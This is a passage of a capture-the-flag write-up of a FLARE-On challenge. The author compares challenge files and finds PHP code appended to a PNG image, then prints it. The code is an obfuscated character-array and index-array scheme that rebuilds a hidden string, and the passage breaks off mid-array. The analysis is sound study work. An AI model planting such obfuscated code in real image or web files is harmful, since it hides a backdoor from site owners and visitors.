</span></span><span style=display:flex><span>vboxmanage setextradata [<span style=color:#cb4b16>VMname</span>] <span style=color:#2aa198>&#34;VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled&#34;</span> <span style=color:#2aa198>&#34;1&#34;</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Changing the time did not mess with anything.</p><p>We can diff the htmls or use Notepad++'s <a href=http://www.davidtan.org/how-to-compare-two-text-files-using-notepad-plus/ target=_blank rel="noreferrer noopener">compare</a> plugin.
Most differences are aesthetic. There are two interesting differences. In line 54, <code>original_html</code> has <code>&lt;img src="The%20FLARE%20On%20Challenge_files/flare-on-V2.png"></code> while <code>challenge_html</code> includes <code>&lt;img src="img/flare-on.png"></code>. So the file in the website is version 2 of the image. Later in the <code>challenge_html</code> we see more evidence of this image file <code>&lt;?php include "img/flare-on-V3.png" ?></code>. But wait a minute, the filesize of these images were different:</p><figure class=code><figcaption><span>Different sizes</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>-rwx------+ <span style=color:#2aa198>1</span> TyRaX None <span style=color:#2aa198>9560</span> Jul  <span style=color:#2aa198>7</span> <span style=color:#2aa198>21</span>:<span style=color:#2aa198>30</span> <span style=color:#b58900>flare-on</span>.png
</span></span><span style=display:flex><span>-rwx------+ <span style=color:#2aa198>1</span> TyRaX None <span style=color:#2aa198>6596</span> Dec <span style=color:#2aa198>18</span>  <span style=color:#2aa198>2013</span> <span style=color:#b58900>flare-on</span>-V2.png</span></span></code></pre></td></tr></table></div></div></div></figure><p>The challenge png is bigger. I used <code>HxD</code> to compare these two files (as they are not text) and at the end of <code>flare-on.png</code> I saw some PHP code. To be honest I was thinking of steganography or some <a href=https://twitter.com/angealbertini target=_blank rel="noreferrer noopener">Ange Albertini magic</a>. But that would have been too hard for level 2. Here is the PHP code (beautified):</p><figure class=code><figcaption><span>Code inside png</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#719e07>&lt;?</span>php
</span></span><span style=display:flex><span><span style=color:#268bd2>$terms</span><span style=color:#719e07>=</span><span style=color:#719e07>array</span>(<span style=color:#2aa198>&#34;M&#34;</span>, <span style=color:#2aa198>&#34;Z&#34;</span>, <span style=color:#2aa198>&#34;]&#34;</span>, <span style=color:#2aa198>&#34;p&#34;</span>, <span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\\</span><span style=color:#2aa198>&#34;</span>, <span style=color:#2aa198>&#34;w&#34;</span>, <span style=color:#2aa198>&#34;f&#34;</span>, <span style=color:#2aa198>&#34;1&#34;</span>, <span style=color:#2aa198>&#34;v&#34;</span>, <span style=color:#2aa198>&#34;&lt;&#34;</span>, <span style=color:#2aa198>&#34;a&#34;</span>, <span style=color:#2aa198>&#34;Q&#34;</span>, <span style=color:#2aa198>&#34;z&#34;</span>, <span style=color:#2aa198>&#34; &#34;</span>, <span style=color:#2aa198>&#34;s&#34;</span>, <span style=color:#2aa198>&#34;m&#34;</span>, <span style=color:#2aa198>&#34;+&#34;</span>, <span style=color:#2aa198>&#34;E&#34;</span>, <span style=color:#2aa198>&#34;D&#34;</span>, <span style=color:#2aa198>&#34;g&#34;</span>, <span style=color:#2aa198>&#34;W&#34;</span>, <span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\&#34;</span><span style=color:#2aa198>&#34;</span>, <span style=color:#2aa198>&#34;q&#34;</span>, <span style=color:#2aa198>&#34;y&#34;</span>, <span style=color:#2aa198>&#34;T&#34;</span>, <span style=color:#2aa198>&#34;V&#34;</span>, <span style=color:#2aa198>&#34;n&#34;</span>, <span style=color:#2aa198>&#34;S&#34;</span>, <span style=color:#2aa198>&#34;X&#34;</span>, <span style=color:#2aa198>&#34;)&#34;</span>, <span style=color:#2aa198>&#34;9&#34;</span>, <span style=color:#2aa198>&#34;C&#34;</span>, <span style=color:#2aa198>&#34;P&#34;</span>, <span style=color:#2aa198>&#34;r&#34;</span>, <span style=color:#2aa198>&#34;&amp;&#34;</span>, <span style=color:#2aa198>&#34;\&#39;&#34;</span>, <span style=color:#2aa198>&#34;!&#34;</span>, <span style=color:#2aa198>&#34;x&#34;</span>, <span style=color:#2aa198>&#34;G&#34;</span>, <span style=color:#2aa198>&#34;:&#34;</span>, <span style=color:#2aa198>&#34;2&#34;</span>, <span style=color:#2aa198>&#34;~&#34;</span>, <span style=color:#2aa198>&#34;O&#34;</span>, <span style=color:#2aa198>&#34;h&#34;</span>, <span style=color:#2aa198>&#34;u&#34;</span>, <span style=color:#2aa198>&#34;U&#34;</span>, <span style=color:#2aa198>&#34;@&#34;</span>, <span style=color:#2aa198>&#34;;&#34;</span>, <span style=color:#2aa198>&#34;H&#34;</span>, <span style=color:#2aa198>&#34;3&#34;</span>, <span style=color:#2aa198>&#34;F&#34;</span>, <span style=color:#2aa198>&#34;6&#34;</span>, <span style=color:#2aa198>&#34;b&#34;</span>, <span style=color:#2aa198>&#34;L&#34;</span>, <span style=color:#2aa198>&#34;&gt;&#34;</span>, <span style=color:#2aa198>&#34;^&#34;</span>, <span style=color:#2aa198>&#34;,&#34;</span>, <span style=color:#2aa198>&#34;.&#34;</span>, <span style=color:#2aa198>&#34;l&#34;</span>, <span style=color:#2aa198>&#34;$&#34;</span>, <span style=color:#2aa198>&#34;d&#34;</span>, <span style=color:#2aa198>&#34;`&#34;</span>, <span style=color:#2aa198>&#34;%&#34;</span>, <span style=color:#2aa198>&#34;N&#34;</span>, <span style=color:#2aa198>&#34;*&#34;</span>, <span style=color:#2aa198>&#34;[&#34;</span>, <span style=color:#2aa198>&#34;0&#34;</span>, <span style=color:#2aa198>&#34;}&#34;</span>, <span style=color:#2aa198>&#34;J&#34;</span>, <span style=color:#2aa198>&#34;-&#34;</span>, <span style=color:#2aa198>&#34;5&#34;</span>, <span style=color:#2aa198>&#34;_&#34;</span>, <span style=color:#2aa198>&#34;A&#34;</span>, <span style=color:#2aa198>&#34;=&#34;</span>, <span style=color:#2aa198>&#34;{&#34;</span>, <span style=color:#2aa198>&#34;k&#34;</span>, <span style=color:#2aa198>&#34;o&#34;</span>, <span style=color:#2aa198>&#34;7&#34;</span>, <span style=color:#2aa198>&#34;#&#34;</span>, <span style=color:#2aa198>&#34;i&#34;</span>, <span style=color:#2aa198>&#34;I&#34;</span>, <span style=color:#2aa198>&#34;Y&#34;</span>, <span style=color:#2aa198>&#34;(&#34;</span>, <span style=color:#2aa198>&#34;j&#34;</span>, <span style=color:#2aa198>&#34;/&#34;</span>, <span style=color:#2aa198>&#34;?&#34;</span>, <span style=color:#2aa198>&#34;K&#34;</span>, <span style=color:#2aa198>&#34;c&#34;</span>, <span style=color:#2aa198>&#34;B&#34;</span>, <span style=color:#2aa198>&#34;t&#34;</span>, <span style=color:#2aa198>&#34;R&#34;</span>, <span style=color:#2aa198>&#34;4&#34;</span>, <span style=color:#2aa198>&#34;8&#34;</span>, <span style=color:#2aa198>&#34;e&#34;</span>, <span style=color:#2aa198>&#34;|&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#268bd2>$order</span><span style=color:#719e07>=</span><span style=color:#719e07>array</span>(<span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>73</span>, <span style=color:#2aa198>13</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>10</span>, <span style=color:#2aa198>20</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>76</span>, <span style=color:#2aa198>10</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>76</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>20</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>60</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>60</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>80</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>3</span>, <span style=color:#2aa198>86</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>88</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>80</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>20</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>76</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>15</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>88</span>, <span style=color:#2aa198>32</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>52</span>, <span style=color:#2aa198>80</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>72</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>60</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>72</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>79</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>3</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>88</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>47</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>73</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>8</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>15</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>52</span>, <span style=color:#2aa198>31</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>47</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>73</span>, <span style=color:#2aa198>21</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>6</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>6</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span 